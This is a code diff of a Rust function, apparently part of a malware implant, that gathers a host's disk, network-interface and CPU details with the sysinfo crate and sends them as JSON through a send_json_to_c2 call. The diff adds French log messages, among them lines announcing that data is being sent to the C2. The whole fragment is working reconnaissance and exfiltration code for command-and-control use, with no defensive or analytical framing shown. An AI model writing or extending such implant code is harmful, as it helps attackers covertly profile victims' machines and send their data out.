@@ -4,9 +4,12 @@ use serde_json::json;
 use sysinfo::{Disks, Networks, System};
 
 pub async fn get_sysinfo() -> Result<()> {
+    println!("[logs] Début de la récupération des infos système...");
     let mut sys = System::new();
+    println!("[logs] Rafraîchissement des infos système...");
     sys.refresh_all();
 
+    println!("[logs] Récupération des disques...");
     let disks = Disks::new_with_refreshed_list();
     let disk_details: Vec<_> = disks
         .iter()
@@ -30,7 +33,10 @@ pub async fn get_sysinfo() -> Result<()> {
             })
         })
         .collect();
+    
+    println!("[logs] {} disques trouvés", disk_details.len());
 
+    println!("[logs] Récupération des réseaux...");
     let networks = Networks::new_with_refreshed_list();
     let network_details: Vec<_> = networks
         .iter()
@@ -41,6 +47,8 @@ pub async fn get_sysinfo() -> Result<()> {
             })
         })
         .collect();
+    
+    println!("[logs] {} interfaces réseau trouvées", network_details.len());
 
     let cpu_info = json!({
         "cores": sys.cpus().len(),
@@ -64,6 +72,8 @@ pub async fn get_sysinfo() -> Result<()> {
         "Network Details": network_details,
     });
 
+    println!("[logs] Envoi des données au C2...");
     send_json_to_c2(&json).await?;
+    println!("[logs] Données envoyées au C2");
     Ok(())
 }
